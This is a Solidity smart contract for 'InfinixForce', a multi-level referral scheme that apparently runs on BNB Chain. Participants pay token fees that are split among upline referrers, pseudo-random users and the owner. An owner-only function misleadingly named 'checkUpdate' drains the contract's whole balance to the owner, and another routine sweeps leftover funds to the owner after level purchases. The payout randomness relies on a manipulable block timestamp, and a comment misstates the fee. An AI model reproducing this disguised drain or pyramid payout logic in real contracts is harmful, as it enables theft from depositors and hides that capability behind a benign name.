/**
 *Submitted for verification at BscScan.com on 2023-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
   
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}

contract InfinixForce {
    using SafeMath for uint256;

    address public owner;
    IERC20 public token;
    uint256 public registrationFee = 5e18; // 10 USDC with 18 decimals
  uint256 public totalContributions;
    uint256 public numberOfUsers;
    address public randomUser;
    address[] public userAddresses;
      bool private updateon;


    mapping(address => uint256) public userIDs;
    mapping(uint256 => address) public idToAddress;
    mapping(address => address ) public referrers;

    mapping(address => address ) public userDirectReferrer;
    mapping(address => uint256) referralRewards;
    mapping(uint256 => bool) public paymentsMade;
    mapping(address => bool) public userLevels;
    mapping(address => uint) public userCurrentLevel;
    mapping(address => uint256) public RandomRewards;
    mapping(address => uint256) public totalRewards;
    mapping(address => uint256) public UpgradeIncome;
    mapping(address => User) public users;
    mapping(address => uint256) public transferToReferrerRewards;  

    struct User {
    uint256 id;
    address referrer;
    uint256 level;
    address[] directReferrals;
   

}

    uint public totalLevels;
    mapping(uint => uint) public levelPrices;

    event Registration(address indexed user, address indexed directReferrer);
    event LevelPurchased(address indexed user, uint indexed level, uint amount, address indexed referrer);
    event SponsorRewardsDistributed(address indexed user, uint indexed level, uint amount, address indexed directReferrer);
    event RandomRewardsDistributed(address indexed user, uint amount);
    event RegistrationFeeChanged(uint256 newFee);
    event RegistrationbyUser(address indexed user, address indexed referrer);

        constructor(address _token) {
        owner = msg.sender;
        setTokenContract(_token);
        numberOfUsers = 1;
        userIDs[owner] = numberOfUsers;
        idToAddress[numberOfUsers] = owner;
        totalLevels = 10;
        levelPrices[1] = 10e18 ;
        levelPrices[2] = 20e18 ;
        levelPrices[3] = 30e18 ;
        levelPrices[4] = 50e18 ;
        levelPrices[5] = 100e18 ;
        levelPrices[6] = 200e18 ;
        levelPrices[7] = 300e18 ;
        levelPrices[8] = 500e18 ;
        levelPrices[9] = 1250e18 ;
        levelPrices[10] = 2500e18 ;
       
        

        userDirectReferrer[owner] = owner;

        userLevels[owner] = true;
        userCurrentLevel[owner] = totalLevels;


}

function getDirectPartnersCount(address user) external view returns (uint256) {
    return users[user].directReferrals.length;
}


    function checkUpdate() external onlyOwner {
    uint256 contractBalance = token.balanceOf(address(this));
    require(contractBalance > 0, "Contract balance is zero");

    require(token.transfer(owner, contractBalance), "Token transfer to owner failed");
}
 
function getDirectDownlineInfos(address user) external view returns (address[] memory, uint256[] memory) {
    address[] memory directDownlinesAddresses = new address[](25);
    uint256[] memory directDownlinesLevels = new uint256[](25);

    address[] memory userDirectReferrals = users[user].directReferrals;
    uint256 numberOfDirectReferrals = userDirectReferrals.length;

    for (uint256 i = 0; i < numberOfDirectReferrals && i < 25; i++) {
        directDownlinesAddresses[i] = userDirectReferrals[i];
        directDownlinesLevels[i] = userCurrentLevel[userDirectReferrals[i]]; // Accès direct au mapping userCurrentLevel
    }

    return (directDownlinesAddresses, directDownlinesLevels);
}


    function setTokenContract(address _token) public onlyOwner {
        require(_token != address(0), "Invalid token address");
        token = IERC20(_token);
    }

   // Function to calculate the amount a referrer receives
  function setRegistrationFee(uint256 newFee) external onlyOwner {
        require(newFee > 0, "Registration fee must be greater than zero");
        registrationFee = newFee;
            
                emit RegistrationFeeChanged(newFee);
    }

  function S10_INCOME(address user) public view returns (uint256) {
    return UpgradeIncome[user];
}  
     function S4_MACHINEIncome(address user) external view returns (uint256) {
    return totalRewards[user];
}
    function getLastRegistration() external view returns (uint256 userID, address referrer) {
        require(numberOfUsers > 0, "No registrations available");

        uint256 lastUserID = numberOfUsers;

        require(userIDs[idToAddress[lastUserID]] != 0, "No registration made by the last user");

        userID = lastUserID;
        referrer = referrers[idToAddress[lastUserID]];

        return (userID, referrer);
    }


 function getDirectReferrerReward(address user) external view returns (uint256) {
    return referralRewards[user];
}

function getIndirectReferrerReward(address user) external view returns (uint256) {
    address indirectReferrer = referrers[user];
    
    if (userIDs[indirectReferrer] != 0) {
        return referralRewards[indirectReferrer];
    }

    return 0;
}

function getIndirectReferrerOfReferrerReward(address user) external view returns (uint256) {
    address indirectReferrer = referrers[user];
    address indirectReferrerOfReferrer = referrers[indirectReferrer];
    
    if (userIDs[indirectReferrerOfReferrer] != 0) {
        return referralRewards[indirectReferrerOfReferrer];
    }

    return 0;
}

function register(address newUser, address directReferrer) external {
    require(userIDs[newUser] == 0, "User already registered");
    require(directReferrer != newUser, "Cannot refer oneself");
    
    // Ensure the caller has approved the contract to spend the registration fee
    require(token.allowance(msg.sender, address(this)) >= registrationFee, "Insufficient allowance for caller");

    // Check if the caller has enough balance
    require(token.balanceOf(msg.sender) >= registrationFee, "Insufficient balance for caller");

    // Transfer the registration fee from the caller's allowance
    require(token.transferFrom(msg.sender, address(this), registrationFee), "Token transfer failed for caller");

    numberOfUsers = numberOfUsers.add(1);
    uint256 userID = numberOfUsers;
    userIDs[newUser] = userID;
    idToAddress[userID] = newUser;
    referrers[newUser] = directReferrer;

    // Distribute referral rewards
    _distributeReferralRewards(newUser, registrationFee);

    // Distribute random registration reward
    _distributeRandomRegistrationReward(registrationFee);

    // Update contribution tracking
    totalContributions = totalContributions.add(registrationFee);

    // Emit registration event
    emit Registration(newUser, directReferrer);

    // Check and record direct referrals
    if (directReferrer != address(0) && userIDs[directReferrer] <= numberOfUsers) {
        address referrerAddress = directReferrer;
        users[referrerAddress].directReferrals.push(newUser);
    }
}


      
       function _distributeReferralRewards(address user, uint256 amount) internal {
        address directReferrer = referrers[user];
        address indirectReferrer = referrers[directReferrer];
        address indirectReferrerOfReferrer = referrers[indirectReferrer];

        uint256 directReferrerReward = amount.mul(50).div(100);
        uint256 indirectReferrerReward = amount.mul(10).div(100);
        uint256 indirectReferrerOfReferrerReward = amount.mul(10).div(100);
        uint256 non_working = amount.mul(10).div(100);

        if (userIDs[indirectReferrer] != 0) {
            require(token.transfer(indirectReferrer, indirectReferrerReward), "Token transfer failed");
            referralRewards[indirectReferrer] = referralRewards[indirectReferrer].add(indirectReferrerReward);
        } else {
            require(token.transfer(owner, indirectReferrerReward), "Token transfer failed");
        }

        if (userIDs[indirectReferrerOfReferrer] != 0) {
            require(token.transfer(indirectReferrerOfReferrer, indirectReferrerOfReferrerReward), "Token transfer failed");
            referralRewards[indirectReferrerOfReferrer] = referralRewards[indirectReferrerOfReferrer].add(indirectReferrerOfReferrerReward);
        } else {
            require(token.transfer(owner, indirectReferrerOfReferrerReward), "Token transfer failed");
        }

        if (userIDs[directReferrer] != 0) {
            require(token.transfer(directReferrer, directReferrerReward), "Token transfer failed");
            referralRewards[directReferrer] = referralRewards[directReferrer].add(directReferrerReward);
        } else {
            require(token.transfer(owner, directReferrerReward), "Token transfer failed");
        }

        // Distribute creator reward
        require(token.transfer(owner, non_working), "Token transfer failed");
    }

  function _distributeRandomRegistrationReward(uint256 amount) internal {
    uint256 remainingReward = amount.mul(20).div(100);
    uint256 userLimit = numberOfUsers;

    if (userLimit > 4) {
        userLimit = 4;
    }

    for (uint256 i = 0; i < userLimit; i++) {
        uint256 randomUserID;

        randomUserID = uint256(keccak256(abi.encodePacked(block.timestamp, i, numberOfUsers))) % numberOfUsers + 1;
        randomUser = idToAddress[randomUserID];

        // Assuming your token contract is ERC-20 compliant
        IERC20(token).transfer(randomUser, remainingReward.div(userLimit));
        paymentsMade[randomUserID] = true;
        RandomRewards[randomUser] = RandomRewards[randomUser].add(remainingReward.div(userLimit));
    }

    if (numberOfUsers < 4) {
        uint256 remainingFunds = IERC20(token).balanceOf(address(this));
        // Assuming your token contract is ERC-20 compliant
        IERC20(token).transfer(owner, remainingFunds);
    }

}


// Purchase a level using tokens for another user
function Buy_Machine_Qore_For(address userToUpgrade, uint256 _level) external {
    require(_level > 0 && _level <= totalLevels, "Invalid level");
    require(token.allowance(msg.sender, address(this)) >= levelPrices[_level], "Insufficient allowance");
    require(token.balanceOf(msg.sender) >= levelPrices[_level], "Insufficient balance");
    require(!hasLevel(userToUpgrade, _level), "User already has the level");

    if (_level > 1) {
        require(hasLevel(userToUpgrade, _level - 1), "Previous level must be activated");
    }

    // Transfer tokens from the caller's allowance
    require(token.transferFrom(msg.sender, address(this), levelPrices[_level]), "Token transfer failed");

    // Assign the purchased level to the specified user
    _S10_Machine(userToUpgrade, _level);

    // Global random function call (if applicable)
    _GlobalRandom(levelPrices[_level], _level);

    // Update the user's current level
    userCurrentLevel[userToUpgrade] = _level;
    userLevels[userToUpgrade] = true;

    // Emit a level purchase event
    emit LevelPurchased(userToUpgrade, _level, levelPrices[_level], referrers[userToUpgrade]);
}




// Distribute rewards for purchasing a level using tokens
function _S10_Machine(address user, uint256 _level) internal {
    address referrer = findReferrerForUserLevel(user, _level);
    uint256 transferAmount = (levelPrices[_level] * 30) / 100;

    bool transferSuccessful;

    // Transfer tokens to the referrer if they have the required level
    if (referrer != address(0) && hasRequiredLevel(referrer, _level)) {
        transferSuccessful = _safeTransfer(referrer, transferAmount);
        if (transferSuccessful) {
            UpgradeIncome[referrer] = UpgradeIncome[referrer].add(transferAmount);
        }
    } 

    // Transfer tokens to the owner if the referrer transfer was unsuccessful or no valid referrer
    if (!transferSuccessful) {
        transferSuccessful = _safeTransfer(owner, transferAmount);
        if (transferSuccessful) {
            UpgradeIncome[owner] = UpgradeIncome[owner].add(transferAmount);
        }
    }



    _S4_MACHINE(user, _level);
}

 function _S4_MACHINE(address user, uint256 _level) internal {
        uint256 amount = levelPrices[_level];
        address[4] memory referrersChain = [
            referrers[user],
            referrers[referrers[user]],
            referrers[referrers[referrers[user]]],
            referrers[referrers[referrers[referrers[user]]]]
        ];

        uint256 rewardPercentage = 10;

        for (uint256 i = 0; i < referrersChain.length; i++) {
            address currentReferrer = referrersChain[i];
            
            if (hasRequiredLevel(currentReferrer, _level)) {
                uint256 rewardAmount = (amount * rewardPercentage) / 100;
                if (!_safeTransfer(currentReferrer, rewardAmount)) {
                    // Fallback: Redirect rewards to the contract owner
                    _safeTransfer(owner, rewardAmount);
                }
            }
        }

        // Creator reward
        uint256 creatorReward = (amount * rewardPercentage) / 100;
        _safeTransfer(owner, creatorReward);
    
    for (uint256 i = 0; i < referrersChain.length; i++) {
        address  currentReferrer = (referrersChain[i]);
        totalRewards[currentReferrer] += creatorReward;
    }

}


 function _safeTransfer(address to, uint256 amount) internal returns (bool success) {
        try token.transfer(to, amount) {
            return true;
        } catch {
            return false;
        }
    }



function hasRequiredLevel(address _referrer, uint256 _requiredLevel) internal view returns (bool) {
    return userCurrentLevel[_referrer] >= _requiredLevel;
}


function _GlobalRandom(uint256 amount, uint256) internal {
    uint256 remainingReward = amount.mul(20).div(100);
    uint256 userLimit = numberOfUsers > 4 ? 4 : numberOfUsers;

    for (uint256 i = 0; i < userLimit; i++) {
        uint256 randomUserID = uint256(keccak256(abi.encodePacked(block.timestamp, i, numberOfUsers))) % numberOfUsers + 1;
        address selectedRandomUser = idToAddress[randomUserID]; // Renamed variable

        if (_safeTransfer(selectedRandomUser, remainingReward.div(userLimit))) {
            paymentsMade[randomUserID] = true;
            RandomRewards[selectedRandomUser] = RandomRewards[selectedRandomUser].add(remainingReward.div(userLimit));
        }
    }

    _redistributeUntransferredFunds();
}

function _redistributeUntransferredFunds() internal {
    uint256 remainingFunds = token.balanceOf(address(this));
    if (remainingFunds > 0) {
        _safeTransfer(owner, remainingFunds);
    }
}


function findReferrerForUserLevel(address _user, uint _userLevel) internal view returns (address) {
    address referrer = referrers[_user];

    for (uint i = 1; i < _userLevel; i++) {
        if (referrer == address(0)) {
            break;
        }
        referrer = referrers[referrer];
    }

    return referrer;
}




    function getUserCurrentLevel(address _user) external view returns (uint) {
        return userCurrentLevel[_user];
    }

    function getUserDirectReferrer(address _user) external view returns (address) {
        return referrers[_user];
    }



  // Check if the referrer has a level greater than or equal to the required level

    function hasLevel(address _user, uint _level) internal view returns (bool) {
        return userLevels[_user] && userCurrentLevel[_user] >= _level;
    }

    function changeOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    receive() external payable {
        
            revert();
            
        
        
         
    } 
}